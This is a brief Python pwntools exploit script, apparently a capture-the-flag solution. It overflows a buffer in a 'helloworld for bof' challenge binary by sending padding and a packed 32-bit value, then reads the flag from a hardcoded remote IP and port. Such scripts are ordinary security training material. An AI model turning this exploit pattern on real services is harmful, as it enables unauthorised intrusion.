#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target=['./4f2f44c9471d4dc2b59768779e378282']
use_gdb = False
#use_gdb = True

#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()

    p.recvuntil("lets get helloworld for bof")
    p.send(b'a'*4 + p32(0x6E756161))

    #p.recv()

    p.recvuntil(b'\n')
    if remote_run:
        #p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:33759'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
